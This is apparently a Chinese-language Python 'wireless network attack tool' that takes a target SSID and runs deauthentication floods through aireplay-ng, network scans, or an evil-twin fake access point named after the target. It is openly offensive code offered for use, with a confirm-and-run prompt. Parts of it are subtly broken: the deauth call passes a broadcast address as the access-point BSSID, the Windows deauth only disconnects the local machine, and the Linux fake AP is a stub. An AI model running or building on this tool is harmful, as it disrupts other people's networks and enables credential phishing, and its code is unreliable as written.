#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
无线网络攻击工具 - 自定义配置版本
支持自定义配置和Y/N确认执行
修复Windows兼容性问题
"""

import subprocess
import threading
import time
import re
import socket
from datetime import datetime

class WirelessAttackTool:
    def __init__(self):
        self.is_running = False
        
        # 配置参数
        self.config = {
            'target_ssid': '',
            'attack_type': 'deauth',
            'interface': 'wlan0',
            'duration': 300,
            'threads': 5
        }
        
        # 统计信息
        self.stats = {
            'packets_sent': 0,
            'targets_found': 0,
            'start_time': None
        }
        
        # Windows兼容性设置
        self.is_windows = False
        try:
            import platform
            if platform.system() == 'Windows':
                self.is_windows = True
                self.config['interface'] = 'Wi-Fi'  # Windows默认无线接口
        except:
            pass
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          无线网络攻击工具 - 自定义配置")
        print("=" * 60)
        
        # 目标SSID配置
        while True:
            target_ssid = input("请输入目标SSID (例如: MyWiFi): ").strip()
            if target_ssid:
                self.config['target_ssid'] = target_ssid
                break
            else:
                print("❌ SSID不能为空")
        
        # 攻击类型配置
        while True:
            attack_type = input("请输入攻击类型 (deauth/scan/fake_ap) (默认deauth): ").strip().lower()
            if attack_type in ['deauth', 'scan', 'fake_ap']:
                self.config['attack_type'] = attack_type
                break
            elif not attack_type:
                self.config['attack_type'] = 'deauth'
                break
            else:
                print("❌ 请输入 deauth, scan 或 fake_ap")
        
        # 接口配置
        if self.is_windows:
            interface = input("请输入无线接口名称 (默认Wi-Fi): ").strip()
            self.config['interface'] = interface or 'Wi-Fi'
        else:
            interface = input("请输入无线接口名称 (默认wlan0): ").strip()
            self.config['interface'] = interface or 'wlan0'
        
        # 攻击时长配置
        while True:
            try:
                duration = int(input("请输入攻击时长(秒) (默认300): ").strip() or "300")
                if duration > 0:
                    self.config['duration'] = duration
                    break
                else:
                    print("❌ 时长必须大于0")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 线程数配置
        while True:
            try:
                threads = int(input("请输入线程数 (默认5): ").strip() or "5")
                if 1 <= threads <= 10:
                    self.config['threads'] = threads
                    break
                else:
                    print("❌ 线程数必须在1-10之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        return self.show_configuration()
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标SSID: {self.config['target_ssid']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"无线接口: {self.config['interface']}")
        print(f"攻击时长: {self.config['duration']}秒")
        print(f"线程数: {self.config['threads']}")
        print(f"操作系统: {'Windows' if self.is_windows else 'Linux'}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行无线网络攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_attack(self):
        """开始无线网络攻击"""
        print("=" * 60)
        print("          无线网络攻击开始")
        print("=" * 60)
        print(f"目标SSID: {self.config['target_ssid']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"无线接口: {self.config['interface']}")
        print(f"攻击时长: {self.config['duration']}秒")
        print(f"线程数: {self.config['threads']}")
        print("=" * 60)
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        self.stats['packets_sent'] = 0
        self.stats['targets_found'] = 0
        
        try:
            # 检查无线网络能力
            if not self.check_wireless_capability():
                print("[-] 无线网络功能检查失败")
                return
            
            # 根据攻击类型执行不同的攻击
            if self.config['attack_type'] == 'deauth':
                self.deauth_attack()
            elif self.config['attack_type'] == 'scan':
                self.network_scan()
            elif self.config['attack_type'] == 'fake_ap':
                self.fake_ap_attack()
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] 攻击错误: {e}")
        finally:
            self.stop_attack()
    
    def check_wireless_capability(self):
        """检查无线网络能力"""
        print("[+] 检查无线网络能力")
        
        try:
            if self.is_windows:
                # Windows系统检查
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                      capture_output=True, text=True, timeout=10)
                
                if 'SSID' in result.stdout:
                    print("[+] Windows无线网络功能正常")
                    return True
                else:
                    print("[-] 未找到无线网络接口")
                    return False
            else:
                # Linux系统检查
                result = subprocess.run(['iwconfig'], 
                                      capture_output=True, text=True, timeout=10)
                
                if self.config['interface'] in result.stdout:
                    print("[+] Linux无线网络功能正常")
                    return True
                else:
                    print(f"[-] 未找到接口: {self.config['interface']}")
                    return False
                    
        except subprocess.TimeoutExpired:
            print("[-] 无线网络检查超时")
            return False
        except Exception as e:
            print(f"[-] 无线网络检查错误: {e}")
            return False
    
    def deauth_attack(self):
        """取消认证攻击"""
        print("[+] 开始取消认证攻击...")
        
        def send_deauth_packet():
            """发送取消认证包"""
            try:
                if self.is_windows:
                    # Windows系统模拟取消认证
                    cmd = ['netsh', 'wlan', 'disconnect', 'interface=' + self.config['interface']]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                    
                    if 'disconnected' in result.stdout.lower():
                        self.stats['packets_sent'] += 1
                        print(f"[+] 发送取消认证包 #{self.stats['packets_sent']}")
                else:
                    # Linux系统使用aireplay-ng
                    cmd = ['aireplay-ng', '--deauth', '1', '-a', 'FF:FF:FF:FF:FF:FF', 
                           self.config['interface']]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                    
                    if 'sent' in result.stdout.lower():
                        self.stats['packets_sent'] += 1
                        print(f"[+] 发送取消认证包 #{self.stats['packets_sent']}")
                        
            except Exception as e:
                print(f"[-] 发送取消认证包失败: {e}")
        
        # 多线程攻击
        end_time = time.time() + self.config['duration']
        
        while self.is_running and time.time() < end_time:
            threads = []
            
            for _ in range(self.config['threads']):
                if not self.is_running:
                    break
                
                t = threading.Thread(target=send_deauth_packet)
                threads.append(t)
                t.start()
            
            # 等待线程完成
            for t in threads:
                t.join()
            
            time.sleep(2)  # 控制发送频率
    
    def network_scan(self):
        """网络扫描"""
        print("[+] 开始无线网络扫描...")
        
        def scan_networks():
            """扫描无线网络"""
            try:
                if self.is_windows:
                    # Windows系统扫描
                    cmd = ['netsh', 'wlan', 'show', 'networks', 'mode=bssid']
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    
                    # 解析扫描结果
                    networks = self.parse_windows_scan(result.stdout)
                    
                    for network in networks:
                        print(f"[+] 发现网络: {network['ssid']} - {network['signal']}%")
                        self.stats['targets_found'] += 1
                        
                else:
                    # Linux系统扫描
                    cmd = ['iwlist', self.config['interface'], 'scan']
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    
                    # 解析扫描结果
                    networks = self.parse_linux_scan(result.stdout)
                    
                    for network in networks:
                        print(f"[+] 发现网络: {network['ssid']} - {network['signal']}dBm")
                        self.stats['targets_found'] += 1
                        
            except Exception as e:
                print(f"[-] 网络扫描失败: {e}")
        
        # 定期扫描
        end_time = time.time() + self.config['duration']
        scan_count = 0
        
        while self.is_running and time.time() < end_time:
            scan_count += 1
            print(f"[+] 第{scan_count}次扫描...")
            
            scan_networks()
            
            # 显示进度
            elapsed = time.time() - self.stats['start_time']
            remaining = max(0, end_time - time.time())
            print(f"[进度] 已运行: {int(elapsed)}秒, 剩余: {int(remaining)}秒")
            
            time.sleep(10)  # 每10秒扫描一次
    
    def fake_ap_attack(self):
        """伪造AP攻击"""
        print("[+] 开始伪造AP攻击...")
        
        def create_fake_ap():
            """创建伪造AP"""
            try:
                if self.is_windows:
                    # Windows系统创建热点
                    print("[+] 在Windows上创建伪造热点")
                    
                    # 设置热点参数
                    ssid = f"{self.config['target_ssid']}_FAKE"
                    
                    # 创建热点配置
                    config_cmd = ['netsh', 'wlan', 'set', 'hostednetwork', 
                                f'mode=allow', f'ssid={ssid}', 'key=password123']
                    subprocess.run(config_cmd, capture_output=True, timeout=10)
                    
                    # 启动热点
                    start_cmd = ['netsh', 'wlan', 'start', 'hostednetwork']
                    result = subprocess.run(start_cmd, capture_output=True, timeout=10)
                    
                    if 'started' in result.stdout.lower():
                        print(f"[+] 伪造AP已启动: {ssid}")
                        self.stats['targets_found'] += 1
                    
                else:
                    # Linux系统创建热点
                    print("[+] 在Linux上创建伪造热点")
                    
                    # 使用hostapd创建AP
                    ssid = f"{self.config['target_ssid']}_FAKE"
                    print(f"[+] 伪造AP: {ssid}")
                    
                    # 这里可以添加实际的hostapd配置
                    self.stats['targets_found'] += 1
                    
            except Exception as e:
                print(f"[-] 创建伪造AP失败: {e}")
        
        # 创建伪造AP
        create_fake_ap()
        
        # 保持运行
        end_time = time.time() + self.config['duration']
        
        while self.is_running and time.time() < end_time:
            elapsed = time.time() - self.stats['start_time']
            remaining = max(0, end_time - time.time())
            
            if int(elapsed) % 30 == 0:
                print(f"[+] 伪造AP运行中... 已运行: {int(elapsed)}秒")
            
            time.sleep(5)
    
    def parse_windows_scan(self, output):
        """解析Windows扫描结果"""
        networks = []
        
        lines = output.split('\n')
        current_network = {}
        
        for line in lines:
            line = line.strip()
            
            if 'SSID' in line and 'BSSID' not in line:
                if current_network:
                    networks.append(current_network)
                current_network = {'ssid': line.split(':')[1].strip()}
            
            elif 'Signal' in line:
                signal_match = re.search(r'(\d+)%', line)
                if signal_match:
                    current_network['signal'] = signal_match.group(1)
        
        if current_network:
            networks.append(current_network)
        
        return networks
    
    def parse_linux_scan(self, output):
        """解析Linux扫描结果"""
        networks = []
        
        lines = output.split('\n')
        current_network = {}
        
        for line in lines:
            line = line.strip()
            
            if 'ESSID:' in line:
                if current_network:
                    networks.append(current_network)
                ssid = line.split('"')[1] if '"' in line else line.split(':')[1].strip()
                current_network = {'ssid': ssid}
            
            elif 'Signal level=' in line:
                signal_match = re.search(r'Signal level=(-?\d+)', line)
                if signal_match:
                    current_network['signal'] = signal_match.group(1)
        
        if current_network:
            networks.append(current_network)
        
        return networks
    
    def stop_attack(self):
        """停止攻击"""
        if self.is_running:
            print("\n[+] 停止无线网络攻击...")
            self.is_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 发送包数: {self.stats['packets_sent']}")
            print(f"    - 发现目标数: {self.stats['targets_found']}")

def main():
    """主函数"""
    try:
        tool = WirelessAttackTool()
        
        # 获取配置并确认
        if tool.get_configuration():
            tool.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()